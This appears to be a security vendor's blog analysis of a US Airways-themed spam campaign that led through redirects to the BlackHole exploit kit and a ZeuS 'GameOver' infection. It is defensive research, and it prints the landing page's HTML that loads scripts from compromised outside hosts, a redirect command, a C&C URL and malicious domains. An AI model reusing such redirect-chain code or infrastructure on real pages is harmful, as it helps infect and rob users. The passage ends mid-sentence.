On 20 March, we detected a spam campaign targeting passengers of US Airways.
Almost the entire week cybercriminals were sending users the following email allegedly from US Airways:
There is a brief description of the check-in procedure and a confirmation code is provided for online reservation.
The criminals are obviously banking on any recipients flying on the flight mentioned in the email clicking on the link “Online reservation details”.
Different emails contained different links — for example, we noticed the following domains: sulichat.hu, prakash.clanteam.com, panvelkarrealtors.com.
After clicking the link a series of redirects eventually leads to a domain hosting BlackHole Exploit Kit.
A typical BlackHole infection routine is used to infect users’ computers.
The first port of call after clicking the link in the email is a page with the following html code:
<html> <h1 id="wait-please">WAIT PLEASE</h1> <h3 id="loading">Loading…</h3> <script type="text/javascript" src="http://boemelparty.be/&lt;removed&gt;/js.js"></script> <script type="text/javascript" src="http://nhb.prosixsoftron.in/&lt;removed&gt;/js.js"></script> <script type="text/javascript" src="http://sas.hg.pl/&lt;removed&gt;/js.js"></script> <script type="text/javascript" src="http://www.vinhthanh.com.vn/&lt;removed&gt;/js.js"></script> <script type="text/javascript" src="http://www.alpine-turkey.com/&lt;removed&gt;/js.js"></script> <script type="text/javascript" src="http://www.thedugoutdawgs.com/&lt;removed&gt;/js.js"></script> </html>
As a result, javascripts are loaded into the user’s browser from different domains.
The javascripts contain a single command such as: document.location=’http://indigocellular.com/’.
This command redirects the user to a page containing another, obfuscated, javascript.
This javascript’s job is to insert links into the html code of the page that then lead to the object with the exploit.
So far, we’ve detected three types of objects: a JAR file, SWF file and a PDF document.
Each object exploits a vulnerability in the respective application – Java, Flash Player or Adobe Reader — to execute malicious code in the targeted system.
If a vulnerable version of even one of those applications is being used, the attack ends in infection – the malicious executable is loaded and run in the user’s system.
Malicious JAR, SWF and PDF documents are loaded from different domains — e.g.
indigocellular.com, browncellular.com, bronzecellular.com (domains info) — under the names Qai.jar, field.swf, dea86.pdf, 11591.pdf.
We detect these exploits as: Exploit.Java.CVE-2011-3544.mz Exploit.SWF.Agent.gd Exploit.JS.Pdfka.fof
After successfully exploiting vulnerabilities, an executable file is downloaded from the same domains where the exploits are located.
It can be downloaded under different names — about.exe, contacts.exe and others — and is essentially a downloader.
When the downloader runs, it connects to its C&C at the URL “176.28.18.135/pony/gate.php”, and downloads and runs another malicious program – ZeuS/ZBot or, to be more precise, a modification of one of the development branches of that Trojan known as ‘GameOver’ – on the user’s system.
ZeuS is downloaded from hacked sites such as: cinecolor.com.ar bizsizanayasaolmaz.org cyrpainting.cl hellenic-antiaging-academy.gr elektro-pfeffer.at grupozear.es sjasset.com
At all the stages of this attack, every object — domains, links to javascripts, files with exploits, the downloader and ZeuS — was frequently replaced with a new one.
The domains remained “alive” for nearly 12 hours, while the ZeuS samples were replaced more often.
During the short periods of time (a few hours over several days) that I was monitoring what files were being downloaded, I managed to detect 6 modifications of the downloader and 3 modifications of ZeuS.
To recap, a modification includes all the samples that are detected with the same verdict, hence number of detected programs is usually bigger than the number of verdicts.
Downloader verdicts: Trojan-Dropper.Win32.Injector.dpdj Trojan-Dropper.Win32.Injector.dpsk Trojan-Dropper.Win32.Injector.dqwx Trojan-PSW.Win32.Fareit.oo Trojan-PSW.Win32.Fareit.pb Trojan.Win32.Jorik.Downloader.ams
Total number of programs detected with these verdicts: 250.
ZeuS verdicts: Trojan-Dropper.Win32.Injector.dpdj Trojan-Dropper.Win32.Injector.dpsk Trojan-Dropper.Win32.Injector.dqwx
Total number of samples detected with these verdicts: 127.
As I have already mentioned, these were only the verdicts I managed to record.
There were undoubtedly more modifications throughout the course of this particular spam campaign.
It wasn’t just the ZeuS wrapper that was being changed (packer, anti-emulation), the malicious program itself was being recompiled.
ZeuS contains a hardcoded botnet ID string and some IP addresses which the malicious program tries to connect to following infection.
Those data were modified over time as well.
According to the numbers of detected and analyzed samples, we can assume that ZeuS was being recompiled at every second repacking.
Having analyzed 48 versions of the different modifications of ZeuS that were used by cybercriminals in this attack, I discovered 19 unique botnet identificators:
